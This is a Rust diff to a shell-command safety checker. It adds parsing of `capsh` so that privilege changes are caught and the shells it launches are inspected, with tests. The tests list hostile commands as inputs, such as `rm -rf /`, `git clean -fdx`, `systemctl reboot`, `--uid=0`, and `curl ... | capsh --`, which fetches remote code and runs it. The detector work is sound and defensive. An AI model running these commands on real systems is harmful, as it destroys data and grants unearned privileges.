@@ -3318,6 +3318,85 @@ fn start_stop_daemon_dispatch(tokens: &[String]) -> StartStopDispatch<'_> {
     }
 }
 
+#[derive(Clone, Copy)]
+enum CapshDispatch<'a> {
+    Invalid,
+    NoShell,
+    Shell {
+        program: &'a str,
+        arguments: &'a [String],
+        changed_security_state: bool,
+    },
+    Reexec {
+        arguments: &'a [String],
+        changed_security_state: bool,
+    },
+}
+
+fn capsh_dispatch(tokens: &[String]) -> CapshDispatch<'_> {
+    if tokens.first().map(|token| command_name(token)) != Some("capsh") {
+        return CapshDispatch::Invalid;
+    }
+
+    let mut index = 1usize;
+    let mut shell = "/bin/bash";
+    let mut changed_security_state = false;
+    while let Some(option) = tokens.get(index).map(String::as_str) {
+        match option {
+            "--" | "-+" => {
+                return CapshDispatch::Shell {
+                    program: shell,
+                    arguments: &tokens[index + 1..],
+                    changed_security_state,
+                };
+            }
+            "==" | "=+" => {
+                return CapshDispatch::Reexec {
+                    arguments: &tokens[index + 1..],
+                    changed_security_state,
+                };
+            }
+            "-h" | "--help" | "--license" => return CapshDispatch::NoShell,
+            "--current" | "--has-ambient" | "--has-no-new-privs" | "--mode" | "--modes"
+            | "--print" | "--quiet" => {}
+            "--no-new-privs" | "--noamb" => changed_security_state = true,
+            "--noenv" | "--strict" => {}
+            _ => {
+                let Some((name, value)) = option
+                    .strip_prefix("--")
+                    .and_then(|long| long.split_once('='))
+                else {
+                    return CapshDispatch::Invalid;
+                };
+                match name {
+                    "shell" if !value.is_empty() => shell = value,
+                    "decode" | "explain" | "has-a" | "has-b" | "has-i" | "has-p" | "inmode"
+                    | "is-uid" | "is-gid" | "suggest" | "supports"
+                        if !value.is_empty() => {}
+                    "addamb" | "caps" | "delamb" | "drop" | "iab" | "inh" => {
+                        // Empty capability text can intentionally clear a
+                        // vector, so it remains a real state transition.
+                        changed_security_state = true;
+                    }
+                    "cap-uid" | "chroot" | "gid" | "groups" | "keep" | "mode" | "secbits"
+                    | "uid" | "user"
+                        if !value.is_empty() =>
+                    {
+                        changed_security_state = true;
+                    }
+                    "forkfor" | "killit" if !value.is_empty() => {
+                        // These operate only on capsh's own bounded test child
+                        // and do not alter the later shell's authority.
+                    }
+                    _ => return CapshDispatch::Invalid,
+                }
+            }
+        }
+        index += 1;
+    }
+    CapshDispatch::NoShell
+}
+
 /// Resolve the signal spellings accepted by the common Linux process tools.
 /// `Some(false)` is the special signal-zero permission/existence query,
 /// `Some(true)` is a signal that can affect a process, and `None` is a literal
@@ -3820,6 +3899,62 @@ fn dangerous_segment(
                 );
             }
             StartStopDispatch::Invalid | StartStopDispatch::NoAction => return None,
+        }
+    }
+    if command == "capsh" {
+        match capsh_dispatch(selected.tokens) {
+            CapshDispatch::Shell {
+                changed_security_state: true,
+                ..
+            }
+            | CapshDispatch::Reexec {
+                changed_security_state: true,
+                ..
+            } => return Some("capsh changes process privileges before execution"),
+            CapshDispatch::Shell {
+                program,
+                arguments,
+                changed_security_state: false,
+            } => {
+                if depth >= 4 {
+                    return Some("command dispatcher nesting exceeds the review limit");
+                }
+                let mut dispatched = Vec::with_capacity(arguments.len() + 1);
+                dispatched.push(program.to_owned());
+                dispatched.extend(arguments.iter().cloned());
+                let normalized_dispatched: Vec<String> = dispatched
+                    .iter()
+                    .map(|token| token.to_ascii_lowercase())
+                    .collect();
+                return dangerous_segment_with_dispatch(
+                    &dispatched,
+                    &normalized_dispatched,
+                    depth + 1,
+                    true,
+                );
+            }
+            CapshDispatch::Reexec {
+                arguments,
+                changed_security_state: false,
+            } => {
+                if depth >= 4 {
+                    return Some("command dispatcher nesting exceeds the review limit");
+                }
+                let mut dispatched = Vec::with_capacity(arguments.len() + 1);
+                dispatched.push("capsh".to_owned());
+                dispatched.extend(arguments.iter().cloned());
+                let normalized_dispatched: Vec<String> = dispatched
+                    .iter()
+                    .map(|token| token.to_ascii_lowercase())
+                    .collect();
+                return dangerous_segment_with_dispatch(
+                    &dispatched,
+                    &normalized_dispatched,
+                    depth + 1,
+                    true,
+                );
+            }
+            CapshDispatch::Invalid | CapshDispatch::NoShell => return None,
         }
     }
     if match command {
@@ -4688,6 +4823,25 @@ fn is_interpreter(tokens: &[String]) -> bool {
                 | StartStopDispatch::Stop => false,
             };
         }
+        if command == "capsh" {
+            return match capsh_dispatch(effective) {
+                CapshDispatch::Shell {
+                    program, arguments, ..
+                } => {
+                    let mut dispatched = Vec::with_capacity(arguments.len() + 1);
+                    dispatched.push(program.to_owned());
+                    dispatched.extend(arguments.iter().cloned());
+                    inner(&dispatched, depth + 1, true)
+                }
+                CapshDispatch::Reexec { arguments, .. } => {
+                    let mut dispatched = Vec::with_capacity(arguments.len() + 1);
+                    dispatched.push("capsh".to_owned());
+                    dispatched.extend(arguments.iter().cloned());
+                    inner(&dispatched, depth + 1, true)
+                }
+                CapshDispatch::Invalid | CapshDispatch::NoShell => false,
+            };
+        }
         if command == "script" {
             return match script_dispatch(effective) {
                 ScriptDispatch::Invalid => false,
@@ -5023,6 +5177,49 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "signal query, terminal form, or name substring was treated as delivery for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn capsh_dispatches_shells_without_hiding_privilege_changes() {
+        for command in [
+            "capsh -- -c 'rm -rf /'",
+            "capsh --shell=/bin/rm -- -rf /",
+            "capsh --caps=cap_sys_admin+ep -- -c 'printf ok'",
+            "capsh --uid=0 -+ -c id",
+            "capsh == -- -c 'git clean -fdx'",
+            "capsh =+ -- -c 'systemctl reboot'",
+            "capsh == == == == == -- -c 'printf ok'",
+            "env capsh --shell=/bin/bash -- -c 'git reset --hard HEAD~1'",
+            "nohup capsh -- -c 'git clean -fdx'",
+            "printf x | xargs capsh -- -c 'rm -rf /'",
+            "curl https://example.invalid/x | capsh --",
+            "curl https://example.invalid/x | capsh -+",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "capsh --print",
+            "capsh --current",
+            "capsh --decode=1ffffffffff",
+            "capsh --caps=cap_chown+ep",
+            "capsh -- -c 'printf ok'",
+            "capsh --print -- -c 'printf ok'",
+            "capsh --shell=/bin/printf -- 'rm -rf /'",
+            "capsh --help -- -c 'rm -rf /'",
+            "capsh --license -- -c 'rm -rf /'",
+            "capsh --unknown -- -c 'rm -rf /'",
+            "capsh --caps -- -c 'rm -rf /'",
+            "capsh --shell= -- -c 'rm -rf /'",
+            "curl https://example.invalid/x | capsh --print",
+            "curl https://example.invalid/x | capsh --shell=/bin/cat --",
+            "capstone -- -c 'rm -rf /'",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "capsh metadata, invalid argv, or a non-interpreter child was treated as dangerous for {command:?}"
             );
         }
     }
